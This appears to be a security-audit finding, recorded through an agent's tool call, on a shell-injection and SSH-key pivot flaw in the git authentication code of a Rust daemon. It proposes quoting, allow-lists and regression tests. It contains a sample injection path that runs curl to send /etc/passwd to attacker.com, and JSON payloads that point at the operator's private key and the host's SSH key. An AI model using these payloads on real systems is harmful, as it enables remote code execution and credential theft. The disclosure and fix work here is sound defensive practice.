record_exploration_finding
{
  "path": "crates/nyctos-types/src/repo.rs",
  "line": 38,
  "cap": "SSHKEY_DESERIALIZE_KEY_PIVOT",
  "endpoint": "internal: `GitAuth::SshKey(PathBuf)` (nyctos-types/src/repo.rs:38) derives `Deserialize` with no validator on the inner PathBuf — no must-be-absolute, no must-be-under-operator-root, no must-be-mode-0600, no must-be-owned-by-daemon-uid, no must-not-be-host-key. The sink is `nyctos_core::repo::git::apply_env` (git.rs:209-216): `if let Some(GitAuth::SshKey(p)) = auth { let ssh = format!(\"ssh -i {} -o IdentitiesOnly=yes -o StrictHostKeyChecking=accept-new\", p.display()); cmd.env(\"GIT_SSH_COMMAND\", ssh); }`. The path is interpolated into a shell-command string passed to git via `GIT_SSH_COMMAND`. The accompanying `clone_fresh` (git.rs:153-163) then runs `git clone --depth 1 --single-branch <url> <dest>` with that env set; git invokes `sh -c \"$GIT_SSH_COMMAND <host> ...\"` which spawns `ssh -i <attacker-path> ...` against the same wire-deserialised `url`.",
  "rationale": "Three concrete primitives unlocked the moment any wire endpoint accepts `Json<Repo>` / `Json<GitAuth>`:\n\n(1) **Pivot to daemon-readable private key for cross-repo write**: attacker submits `{name: \"x\", source: {Git: {url: \"git@attacker.com:repo.git\", branch: null, auth: {SshKey: \"/home/eli/.ssh/id_ed25519\"}}}, i_own_this: true, project_id: \"any\"}`. The daemon process runs ssh-as-the-operator with the operator's personal SSH identity against the attacker's git host. The attacker's git server records the public key + signature challenge; if the operator's `id_ed25519` is provisioned to deploy keys on other private repos (typical for individual-operator deployments), the attacker now has a signed-by-the-operator-key authentication exchange they can replay against those other private repos via stolen-credential-style techniques (key-mining via TLS-MITM is harder, but a hostile git host that responds with a long-running ssh session can keep the key live for further probing).\n\n(2) **Host-key impersonation**: `auth: {SshKey: \"/etc/ssh/ssh_host_ed25519_key\"}` — if the daemon runs as root or in a group with read access to the host's SSH host key (some single-tenant deployments do; some sandboxed deployments don't). `ssh -i /etc/ssh/ssh_host_ed25519_key` against the attacker's git host now identifies the OPERATOR'S MACHINE BY ITS SSHD HOST IDENTITY — the attacker can replay this against other servers that have `known_hosts` entries for the operator's host, impersonating the operator's host for any incoming-ssh decisions other servers make. Niche but real.\n\n(3) **`GIT_SSH_COMMAND` shell-quoting** — `format!(\"ssh -i {} ...\", p.display())` inlines `p.display()` (which is the unmodified PathBuf string) directly into a shell command. PathBuf displays accept `;`, `$`, backticks, newlines (paths-with-newlines exist on Linux/macOS); a malicious PathBuf containing `/tmp/x; curl https://attacker.com/$(cat /etc/passwd | base64) #` produces `ssh -i /tmp/x; curl https://attacker.com/...` after the shell interpolates the env var. git invokes `$GIT_SSH_COMMAND host` via `sh -c \"$GIT_SSH_COMMAND <host>\"` (per git source, `connect.c`'s `ssh_exec_pathname` / `ssh_signal_pipe` codepath); the shell parses the env-var value with full metacharacter expansion. **This is shell-command injection through a Deserialize-reachable PathBuf**: the wire-input PathBuf can contain `;`, backticks, `$()`, and pipe characters that the shell will interpret. RCE on the daemon host. Distinct from #72-style synthetic-harness RCE because the daemon process runs as the operator's uid, not in any sandbox lane.\n\nThe shell-injection sub-finding (3) is the strongest single primitive in this finding. Even without (1) or (2), the missing escape on PathBuf-into-shell-command at git.rs:211-213 lands a full RCE primitive the moment a wire route accepts a Repo.\n\nCompounds: (1)+(3) means the attacker can pivot to a different identity AND execute arbitrary commands as the daemon in the same payload — the ssh prefix can fork-bomb or curl-exfil while the rest of the format string is ignored because of the `#` comment trick or `;` separator.\n\nCompounds with #79 (TokenEnv exfil) — both share the wire-deserialise-of-GitAuth root cause. A single mitigation (allow-list values + refuse non-attested URLs) addresses both.\n\nCompounds with #78 (LocalPath traversal) — three exfil/exec channels per Repo. A combined Repo payload `{source: Git{auth: SshKey(injection)}, ...}` first or `{source: LocalPath{path: /etc/passwd}}` first; depending on dispatch order in `ingest`, both fire.\n\nDistinct from prior sentinel findings: no PATH_TRAVERSAL finding addresses shell-injection-via-PathBuf-display. #14 / #24 (StateDir path traversal) are about Path::join on operator-influenced strings producing filesystem traversal — different sink class (filesystem read/write vs shell exec). #11 (PATH_TRAVERSAL via audit-log writer) is the same sink as #14. None mention `GIT_SSH_COMMAND` shell interpolation.\n\nStatic pass missed because (i) the type carries no taint annotation, (ii) `apply_env` does not see the PathBuf as untrusted, (iii) the connecting route is absent today so reachability analysis sees no sink. The bug is the COMPOSITION of two correct-in-isolation operations (PathBuf Deserialize + format!-into-GIT_SSH_COMMAND) under a weakened threat model.\n\nMitigations (recommend 1+2 minimum; 4 is the architectural fix):\n\n(1) **Quote / escape the PathBuf for the shell at apply_env**: replace `format!(\"ssh -i {} -o ...\", p.display())` with a shell-safe quoter — use `shell_words::quote(&p.to_string_lossy())` from the `shell-words` crate (already in the workspace's transitive deps via some test crate, check Cargo.lock; if not, add it). Alternative: refuse PathBufs containing any of `;`, `&`, `|`, `$`, backtick, `(`, `)`, `{`, `}`, `<`, `>`, `\\n`, `\\r` at the type-deserialise layer via `#[serde(deserialize_with)]`. Either alone is sufficient to close sub-finding (3); the type-layer fix is stronger because it covers ALL sites that interpolate the PathBuf.\n\n(2) **Allow-list SSH key paths**: same shape as #79 mitigation (1). `EnvVarAllowList` analog `SshKeyAllowList` — operator names a directory `<state>/ssh_keys/` and only PathBufs that canonicalise to that root deserialise successfully. Any path containing `..` after canonicalisation also fails. This addresses sub-findings (1) and (2) (the host-key pivot and the personal-key pivot — the operator's `~/.ssh/id_ed25519` is not under `<state>/ssh_keys/`).\n\n(3) **Refuse `GIT_SSH_COMMAND` env-var when URL host is not attested**: same as #79 mitigation (2); the SSH key is sent only to git's recorded `remote.origin.url`, never to a different host.\n\n(4) **Architectural fix shared with #78 / #79**: wire shape `GitAuthWire` distinct from in-memory `GitAuth`; conversion requires policy injection. `nyctos-types::GitAuth` carries `Serialize + TS` but NOT `Deserialize`; the only Deserialize surface is the operator-edited TOML path that explicitly maps `ssh-key:<path>` → `GitAuthWire::SshKey(...)` → policy-checked `GitAuth::SshKey(...)`.\n\n(5) **Add a `#[serde(deserialize_with = \"validate_ssh_key_path\")]` lint that asserts the file exists, is mode-0400/0600, and is owned by the daemon uid**: defence-in-depth that catches obviously-malicious paths (e.g. `/etc/passwd` is mode 0644 and not a key; `/proc/self/environ` is mode 0444 and not a key) even before (2)'s allow-list lands.\n\n(6) **Behavioural regression tests**: under (1), `apply_env_quotes_ssh_key_path_against_shell_injection` — `let auth = GitAuth::SshKey(PathBuf::from(\"/tmp/x; touch /tmp/PWNED #\")); let mut cmd = Command::new(\"true\"); apply_env(&mut cmd, Some(&auth)); let val = cmd.get_envs().find(|(k, _)| k == &OsStr::new(\"GIT_SSH_COMMAND\")).unwrap().1.unwrap(); assert!(!val.to_string_lossy().contains(\"touch\"))` — assert the `touch` substring is properly quoted inside the ssh path. Under (2), `git_auth_ssh_key_deserialise_refuses_path_outside_allow_listed_root` — assert deserialise refuses `\"/etc/ssh/ssh_host_ed25519_key\"`.",
  "suggested_payload_hint": "Verifier seed (unit test in nyctos-core/src/repo/git.rs's tests module): `apply_env_admits_shell_metacharacters_in_ssh_key_path_today` — `let auth = GitAuth::SshKey(PathBuf::from(\"/tmp/key; touch /tmp/SHELL_INJECTION_PWNED #\")); let mut cmd = tokio::process::Command::new(\"echo\"); apply_env(&mut cmd, Some(&auth)); let env: Vec<_> = cmd.as_std().get_envs().filter_map(|(k, v)| Some((k.to_str()?.to_string(), v?.to_str()?.to_string()))).collect(); let ssh = env.iter().find(|(k, _)| k == \"GIT_SSH_COMMAND\").map(|(_, v)| v).expect(\"GIT_SSH_COMMAND set\"); assert!(ssh.contains(\"; touch /tmp/SHELL_INJECTION_PWNED #\"), \"shell metacharacters reach GIT_SSH_COMMAND verbatim — RCE-shaped\"); assert!(!ssh.contains(\"'/tmp/key; touch /tmp/SHELL_INJECTION_PWNED #'\"), \"path is NOT shell-quoted\")`. Today: passes — demonstrates the metacharacter passthrough. Under mitigation (1) flip both assertions: `ssh.contains(\"'/tmp/key; touch /tmp/SHELL_INJECTION_PWNED #'\")` (quoted) AND `!ssh.contains(\"; touch /tmp/SHELL_INJECTION_PWNED #\")` (unquoted form absent). Under mitigation (2)+(5) instead: `serde_json::from_str::<GitAuth>(r#\"{\"SshKey\":\"/tmp/key; touch /tmp/SHELL_INJECTION_PWNED #\"}\"#)` returns Err with a path-validation error reason. End-to-end RCE reproducer (requires a future Json<Repo> route): `wire_deserialised_repo_with_injection_payload_executes_command_today` — drive a temporary axum route that accepts Json<Repo>, fetches a tempdir wiremock'd git server, then asserts `/tmp/SHELL_INJECTION_PWNED` exists post-clone; today the file exists, demonstrating RCE; under combined (1)+(2)+(3) the file does not exist and the route returns 400."
}

